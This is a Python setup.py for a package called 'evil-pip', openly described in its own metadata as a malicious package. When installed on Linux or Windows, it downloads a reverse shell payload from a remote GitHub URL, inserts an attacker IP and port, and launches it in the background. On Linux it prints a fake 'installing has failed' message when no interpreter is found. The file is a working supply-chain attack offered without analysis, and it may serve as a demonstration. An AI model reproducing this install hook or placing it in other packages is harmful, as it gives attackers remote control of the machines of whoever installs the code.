import setuptools,sys,os
from urllib.request import urlopen
from subprocess import Popen,check_output

# Attacker's IP address and Port
IP = "10.0.0.1"
PORT = 4444

if sys.platform == "linux":

    # Get the Linux reverse shell.
    payload = urlopen("https://raw.githubusercontent.com/0xe2d0/evil-pip/main/scripts/linux.txt").read().decode().strip()

    # Replace IP and Port
    payload = payload.replace('("10.0.0.1",4242)',f'("{IP}",{PORT})')

    # Checking for the victim has which python version 
    # If whereis python/python3 contains / in its output it means the victim has that python version.
    if "/" in check_output(["whereis","python"]).decode().strip():

        # Execute the shell in background for python.
        Popen(["python","-c",payload])
        

    elif "/" in check_output(["whereis","python3"]).decode().strip():

        # Execute the shell in background for python.
        Popen(["python3","-c",payload])

    else:
        print("Installing the library has failed!")

elif sys.platform == "win32":

    # Get the Windows reverse shell.
    payload = urlopen("https://raw.githubusercontent.com/0xe2d0/evil-pip/main/scripts/windows.txt").read().decode().strip()

    # Replace IP and Port
    payload = payload.replace('("10.0.0.1",4242)',f'("{IP}",{PORT})')
    
    # Execute the shell in background.
    Popen(["python","-c",payload])


setuptools.setup(
    name="evil-pip",
    packages=setuptools.find_packages(),
    version="0.0.1",
    license="MIT",
    description="Malicious Python Package",
    author="0xe2d0",
    url="https://github.com/0xe2d0/evil-pip",
    download_url="https://github.com/0xe2d0/evil-pip/tarball/master",
    keywords=[""],
    install_requires=[""],
    classifiers=[],
)
